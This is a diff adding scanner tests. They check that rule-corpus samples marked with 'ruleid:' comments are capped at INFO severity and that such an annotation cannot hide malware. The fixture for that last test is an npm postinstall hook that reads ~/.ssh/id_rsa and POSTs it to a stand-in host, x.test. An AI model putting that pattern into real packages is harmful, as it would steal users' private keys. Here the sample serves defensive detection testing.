@@ -2439,3 +2439,173 @@ class TestTwoImageFormatsConfusedIsNotADisguise:
         for index in range(1, 9):
             (shots / f"{index}.jpg").write_bytes(self.PNG)
         assert "SUSPECT.POLYGLOT.MISMATCH.001" not in flagged(tmp_path)
+
+
+class TestAnotherAnalysersRuleCorpusIsNotAFinding:
+    """`semgrep/semgrep-rules` produced 189 blocking findings and 188 of them were
+    samples the repository publishes in order to be detected:
+
+        // ruleid: adafruit-api-key
+        adafruit_api_token = "9zu9r6idf9c0tfcc4w26l66ij7visb8n"
+
+    That file is two lines long and the first says what the second is for. The same
+    repository supplies a Terraform file with an IAM wildcard, a Kubernetes document
+    whose `privileged: true` is a *pattern* rather than a deployment, and a bash file
+    whose entire content is the capability pair the rule beside it matches. Five
+    detectors fired on them.
+
+    The class is not semgrep's. Any repository that vendors a rule set has the shape,
+    which is most security teams' own repositories and this project's own rule packs --
+    and this detector already had the case on record from Bandit, whose
+    `plugins/trojansource.py` finds Trojan Source attacks and whose
+    `examples/trojansource.py` is the example it was written against.
+
+    A ceiling at INFO rather than a deletion. One comment line is cheap to add, so a
+    predicate that removed findings would be a one-line bypass; the rule still runs and
+    the evidence survives, below the default reporting threshold.
+    """
+
+    ANNOTATED = (
+        b'// ruleid: adafruit-api-key\nadafruit_api_token = "9zu9r6idf9c0tfcc4w26l66ij7visb8n"\n'
+    )
+    RULESET = (
+        b"rules:\n"
+        b"  - id: hardcoded-credential\n"
+        b"    message: A credential is assigned in source\n"
+        b"    languages: [python]\n"
+        b"    severity: ERROR\n"
+        b"    patterns:\n"
+        b'      - pattern: token = "..."\n'
+    )
+
+    @staticmethod
+    def content(path: str, raw: bytes):
+        from cordon_scanner.core.content import FileContent
+
+        return FileContent(path=path, raw=raw, size=len(raw))
+
+    @pytest.mark.parametrize(
+        "line",
+        [
+            b"// ruleid: adafruit-api-key",
+            b"# ruleid: python.lang.security.audit.x",
+            b"# ok: python.lang.security.audit.x",
+            b"// todoruleid: some-rule",
+            b"# todook: some-rule",
+            b"// deepruleid: some-rule",
+            b"-- ruleid: sql-injection",
+            b"  * ruleid: java-thing",
+        ],
+    )
+    def test_the_annotation_family_is_recognised(self, line: bytes) -> None:
+        assert self.content("sample.go", line + b"\nx = 1\n").is_rule_material
+
+    @pytest.mark.parametrize(
+        "line",
+        [
+            b"// TODO: dropbox-long-lived-api-token",
+            b"ruleid: not-in-a-comment",
+            b"// ruleid:",
+            b'print("ok: fine")',
+            b"// okay: something",
+        ],
+    )
+    def test_near_misses_are_not(self, line: bytes) -> None:
+        """Narrow on purpose. The annotation has to start a line, sit in a comment, and
+        name a rule; otherwise prose containing the word would exempt a file."""
+        assert not self.content("sample.go", line + b"\nx = 1\n").is_rule_material
+
+    def test_a_rule_set_is_recognised(self) -> None:
+        assert self.content("rules/credentials.yaml", self.RULESET).is_rule_material
+
+    def test_an_ordinary_document_with_an_id_is_not(self) -> None:
+        """All three signals are required together. A Kubernetes list, an OpenAPI
+        document or a CI file may well have `- id:` in it."""
+        raw = b"rules:\n  - id: allow-http\n    from: 0.0.0.0/0\n"
+        assert not self.content("infra/firewall.yaml", raw).is_rule_material
+
+    @staticmethod
+    def everything(root):
+        """Scanned down to INFO, which is below the default reporting threshold.
+
+        The point of the ceiling is that these drop out of a default scan, so a test
+        that wants to see them has to ask the way a curious reader would."""
+        from cordon_scanner.core.config import Config
+        from cordon_scanner.core.models import Severity
+
+        config = Config.default().with_overrides(severity_threshold=Severity.INFO)
+        return Scanner(config).scan(root)
+
+    def test_a_sample_credential_is_ceilinged(self, tmp_path) -> None:
+        from cordon_scanner.core.models import Severity
+
+        corpus = tmp_path / "generic" / "secrets" / "gitleaks"
+        corpus.mkdir(parents=True)
+        (corpus / "adafruit-api-key.go").write_bytes(self.ANNOTATED)
+        assert not Scanner().scan(tmp_path).findings, "nothing at the default threshold"
+        result = self.everything(tmp_path)
+        secrets = [f for f in result.findings if f.rule_id.startswith("SECRET.")]
+        assert secrets, "the rule still runs and the finding is still made"
+        assert all(f.severity is Severity.INFO for f in secrets)
+        assert "rule material" in secrets[0].message
+
+    def test_an_infrastructure_sample_is_ceilinged(self, tmp_path) -> None:
+        from cordon_scanner.core.models import Severity
+
+        corpus = tmp_path / "terraform" / "aws" / "security"
+        corpus.mkdir(parents=True)
+        (corpus / "public-ingress.tf").write_bytes(
+            b"# ruleid: aws-ec2-security-group-allows-public-ingress\n"
+            b'resource "aws_security_group" "x" {\n'
+            b"  ingress {\n"
+            b'    cidr_blocks = ["0.0.0.0/0"]\n'
+            b"  }\n"
+            b"}\n"
+        )
+        assert not Scanner().scan(tmp_path).findings, "nothing at the default threshold"
+        result = self.everything(tmp_path)
+        iac = [f for f in result.findings if f.rule_id.startswith("SUSPECT.IAC.")]
+        assert iac, "the rule still runs"
+        assert all(f.severity is Severity.INFO for f in iac)
+
+    def test_the_same_file_without_the_annotation_is_reported_in_full(self, tmp_path) -> None:
+        """The control. Remove the one comment line and the finding is a finding again,
+        which is what makes the exemption a statement about rule corpora rather than a
+        weakening of the rule."""
+        from cordon_scanner.core.models import Severity
+
+        corpus = tmp_path / "infra"
+        corpus.mkdir()
+        (corpus / "main.tf").write_bytes(
+            b'resource "aws_security_group" "x" {\n'
+            b"  ingress {\n"
+            b'    cidr_blocks = ["0.0.0.0/0"]\n'
+            b"  }\n"
+            b"}\n"
+        )
+        iac = [f for f in Scanner().scan(tmp_path).findings if f.rule_id.startswith("SUSPECT.IAC.")]
+        assert iac and any(f.severity >= Severity.HIGH for f in iac)
+
+    def test_an_annotation_does_not_hide_malware(self, tmp_path) -> None:
+        """The bypass, tested. MALICIOUS is never ceilinged, so a payload that plants a
+        `// ruleid:` comment gains nothing: this is why the predicate lowers a severity
+        instead of dropping a finding."""
+        package = tmp_path / "pkg"
+        package.mkdir()
+        (package / "package.json").write_text(
+            '{"name": "x", "version": "1.0.0", "scripts": {"postinstall": "node i.js"}}'
+        )
+        (package / "i.js").write_bytes(
+            b"// ruleid: credential-exfiltration\n"
+            + assemble(
+                "const k = require('fs').readFileSync(process.env.HOME + '/.ssh/id_rsa');\n",
+                "require('https').request('https://x.test/c', {method:'POST'}).end(k);\n",
+            ).encode()
+        )
+        assert any(rule.startswith("MALWARE.") for rule in flagged(tmp_path))
+
+    def test_a_binary_is_not_asked(self) -> None:
+        """The signals are text signals. A compiled artefact cannot carry either, and
+        should not pay two regex passes to establish that."""
+        raw = b"\x7fELF" + b"\x00" * 64 + b"// ruleid: x\n"
+        assert not self.content("lib/x.so", raw).is_rule_material
